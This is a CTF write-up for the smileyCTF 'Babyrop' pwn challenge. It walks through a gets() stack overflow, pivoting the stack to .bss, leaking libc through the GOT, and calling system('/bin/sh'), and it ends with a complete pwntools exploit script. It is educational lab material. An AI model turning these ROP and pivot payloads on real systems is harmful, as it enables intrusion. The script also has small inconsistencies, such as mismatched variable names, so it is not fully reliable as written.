# smileyCTF - Babyrop

**Points:** 200 \
**Category:** Pwn

---

## TL;DR

[This challenge exploits a stack BoF using ROP and pivoting with some subtilities to get a shell.]

---

## Provided files:
- **vuln** : ELF 64-bit binary.
- **libc.so.6** : libc 2.39 file.
- **Dockerfile** : Dockerfile to deploy locally.

Protections on the binary:

![Checksec](https://github.com/MohandAcherir/Writeups/blob/main/404CTF/pics/Screenshot%20from%202025-07-16%2001-42-43.png)

## First look at `vuln`:
`vuln` reads user's input from stdin, the displays it back, and that's all it.

### Functions:
```
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401060  setbuf@plt
0x0000000000401070  memset@plt
0x0000000000401080  read@plt
0x0000000000401090  _start
0x00000000004010c0  _dl_relocate_static_pie
0x00000000004010d0  deregister_tm_clones
0x0000000000401100  register_tm_clones
0x0000000000401140  __do_global_dtors_aux
0x0000000000401170  frame_dummy
0x0000000000401176  gadgets
0x0000000000401183  gets
0x00000000004011cf  main
0x0000000000401228  _fini
gef➤  
```
So the sake of the challenge, `main` and `gadgets` are clearly the most useful to analyse:
```
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004011cf <+0>:	endbr64
   0x00000000004011d3 <+4>:	push   rbp
   0x00000000004011d4 <+5>:	mov    rbp,rsp
   0x00000000004011d7 <+8>:	sub    rsp,0x20
   0x00000000004011db <+12>:	mov    rax,QWORD PTR [rip+0x2e36]        # 0x404018 <stdout@GLIBC_2.2.5>
   0x00000000004011e2 <+19>:	mov    esi,0x0
   0x00000000004011e7 <+24>:	mov    rdi,rax
   0x00000000004011ea <+27>:	call   0x401060 <setbuf@plt>
   0x00000000004011ef <+32>:	lea    rax,[rbp-0x20]
   0x00000000004011f3 <+36>:	mov    edx,0x20
   0x00000000004011f8 <+41>:	mov    esi,0x0
   0x00000000004011fd <+46>:	mov    rdi,rax
   0x0000000000401200 <+49>:	call   0x401070 <memset@plt>
   0x0000000000401205 <+54>:	lea    rax,[rbp-0x20]
   0x0000000000401209 <+58>:	mov    rdi,rax
   0x000000000040120c <+61>:	call   0x401183 <gets>
   0x0000000000401211 <+66>:	mov    rdx,QWORD PTR [rip+0x2df8]        # 0x404010 <print>
   0x0000000000401218 <+73>:	lea    rax,[rbp-0x20]
   0x000000000040121c <+77>:	mov    rdi,rax
   0x000000000040121f <+80>:	call   rdx
   0x0000000000401221 <+82>:	mov    eax,0x0
   0x0000000000401226 <+87>:	leave
   0x0000000000401227 <+88>:	ret
End of assembler dump.
gef➤
```

The `main` is fairly simple:
- it first calls `setbuf` to remove buffering.
- then initializes a buffer of 0x20 bytes with 0s.
- then reads with `gets` into that buffer.
- Lastly, it prints it with a call to `print`.


Then, here's `gadgets`:
```
gef➤  disass gadgets
Dump of assembler code for function gadgets:
   0x0000000000401176 <+0>:	endbr64
   0x000000000040117a <+4>:	push   rbp
   0x000000000040117b <+5>:	mov    rbp,rsp
   0x000000000040117e <+8>:	pop    rcx
   0x000000000040117f <+9>:	ret
   0x0000000000401180 <+10>:	nop
   0x0000000000401181 <+11>:	pop    rbp
   0x0000000000401182 <+12>:	ret
End of assembler dump.
gef➤  

```
which is basically a function that's never called and does nothing in particular, but it serves as a gadget reserve for the exploit.


## The Vulnerability :
The vulnerability lies in the `main + 0x61` :

```
   0x0000000000401205 <+54>:	lea    rax,[rbp-0x20]
   0x0000000000401209 <+58>:	mov    rdi,rax
   0x000000000040120c <+61>:	call   0x401183 <gets>

```
`gets` is called on a limited length buffer, and no size check is performed, hence there's a stack buffer overflow.

### Exploitation plan:
- for the lack of having stack leaks, we need to pivot to `.bss` which is RW and its address known (no PIE).
- leak a GOT address, and calculate libc base address
- call system(`/bin/sh`)


## Stage 1: Pivoting
Here's `.bss` section range:
```
0x0000000000404018 - 0x0000000000404028 is .bss
```

And in runtime, we have these data at `0x404010`:
```
gef➤  
0x404010 <print>:	0x00007ffff7c87be0	0x00007ffff7e045c0
0x404020 <completed.0>:	0x0000000000000000	0x0000000000000000
0x404030:	0x0000000000000000	0x0000000000000000
0x404040:	0x0000000000000000	0x0000000000000000
0x404050:	0x0000000000000000	0x0000000000000000
```

At `0x404010` we notice that libc addresses are stored which indicates that its the GOT section, and hence, we need to avoid overwriting it.

**First payload**: `payload = b"a"*32 + p64(0x404040) + p64(0x401205)`
This fills the entire buffer, and overwrites the saved `rbp` with `0x404040` and the saved `rip` with `0x401205`.
why `rbp` to `0x404040`:
In:
```
   0x0000000000401205 <+54>:	lea    rax,[rbp-0x20]
   0x0000000000401209 <+58>:	mov    rdi,rax
   0x000000000040120c <+61>:	call   0x401183 <gets>
```
`rbp - 0x20` is the start of the buffer; and since, we need to start writing from `0x404020 = rbp - 0x20` hence `rbp` must be `0x404040`.

 
## Stage 2: Leaking GOT
At first, leaking a got entry seems to be easily done with a simple ROP by:
- setting rbp to 0x404030.
- then calling the print part of the main function at `0x401211`.

BUT, the `print` function when it's called, pushes many data to the stack, and this entirely corrupts our ROP chain.
```
gef➤  x/15i 0x00007ffff7c87be0
   0x7ffff7c87be0 <__GI__IO_puts>:	endbr64
   0x7ffff7c87be4 <__GI__IO_puts+4>:	push   rbp
   0x7ffff7c87be5 <__GI__IO_puts+5>:	mov    rbp,rsp
   0x7ffff7c87be8 <__GI__IO_puts+8>:	push   r15
   0x7ffff7c87bea <__GI__IO_puts+10>:	push   r14
   0x7ffff7c87bec <__GI__IO_puts+12>:	push   r13
   0x7ffff7c87bee <__GI__IO_puts+14>:	push   r12
   0x7ffff7c87bf0 <__GI__IO_puts+16>:	mov    r12,rdi
   0x7ffff7c87bf3 <__GI__IO_puts+19>:	push   rbx
   0x7ffff7c87bf4 <__GI__IO_puts+20>:	sub    rsp,0x18
   0x7ffff7c87bf8 <__GI__IO_puts+24>:	call   0x7ffff7c28500 <*ABS*+0xb4cc0@plt>
   0x7ffff7c87bfd <__GI__IO_puts+29>:	mov    r14,QWORD PTR [rip+0x17b21c]        # 0x7ffff7e02e20
   0x7ffff7c87c04 <__GI__IO_puts+36>:	mov    rbx,rax
   0x7ffff7c87c07 <__GI__IO_puts+39>:	mov    r13,QWORD PTR [r14]
   0x7ffff7c87c0a <__GI__IO_puts+42>:	test   DWORD PTR [r13+0x0],0x8000
```
To counter this, we decrease `rsp` so that the pushed data doesn't corrupt our data:
```
payload = b"/bin/sh\x00" +p64(0)+ p64(0x404050) + p64(0x401205)
payload += p64(0) + p64(pop_rbp) + p64(0x404010+0x20)
payload += p64(pop_rcx)*70
payload += p64(0x401211)
payload += b"/bin/sh\x00"
```
Explanantion:
- we read `b"/bin/sh\x00" + p64(1) + p64(0x404050) + p64(0x401205)` for later use.
- `p64(0) + p64(pop_rbp) + p64(0x404010+0x20)` sets `rbp` to `0x404010+0x20` = `0x404030` 
- `p64(pop_rcx)*70` is the trick here; it decreases `rsp` for the reason we discussed; 70 is guessed with trial and error.
- `0x401211` is called which prints the contents of `0x404030 - 0x20` = `0x404010` which's `print@got`. 
- since, `rbp = 0x404030`, `leave;ret` then pivots again the stack to point to the first line `b"/bin/sh\x00" +p64(0)+ (HERE)p64(0x404050) + p64(0x401205)`.
- at last, `rbp` is set to `0x404050` and execution returns to `0x401205` which reads data into `0x404050 - 0x20`
Threfore, we get a libc address leak, and resume by reading data (on retombe sur nos pattes).


## Stage 3: Shell execution
Calculating base and system addresses: `print`'s offest is known to be `0x87be0`, therefore
```
libc.address = u64(print_address) - 0x87be0`
system_address = libc.symbols.get("system")
```
last stage payload:
```
payload = b"/bin/sh\x00" + b"A"*24
payload += p64(0xdeadbeef) + p64(system_address)
```
this reads `"/bin/sh\x00"`  into `0x404030` and prints it, therefore `rdi` points to "/bin/sh\x00".\
Lastly, `rbp` is set to `0xdeadbeef` since it doesn't matter, and then execution returns to `system("/bin/sh")`

### Proof of Concept

```
from pwn import *
from pwnlib.term.key import get

context.arch = "amd64"
context.os = "linux"

elf = ELF(vuln_path)
libc = elf.libc

p = process("./vuln")
# p = remote("smiley.cat", 42447)

get_puts = 0x401205
read_got = 0x403FE8
put_rbp_0x20 = 0x401211
leave_ret = 0x401226
pop_rbp =    0x401181
pop_rcx = 0x40117e
bss = 0x404020

payload = b"a"*32 + p64(0x404040) + p64(get_puts)
p.sendline(payload)
        
payload = b"/bin/sh\x00" + p64(1) + p64(0x404050) + p64(get_puts)
payload += p64(0)
payload += p64(pop_rbp)
payload += p64(0x404010+0x20)
payload += p64(pop_rcx)*70
payload += p64(put_rbp_0x20)

p.sendline(payload)

leak = p.recvuntil("\x7f")[-6:].ljust(8, b"\x00")
libc.address = u64(leak) - 0x87be0

system_addr = libc.symbols.get("system")


payload = b"/bin/sh\x00" + b"A"*24
payload += p64(0xdeadbeef) + p64(system_address)
p.sendline(payload)

p.interactive()
```
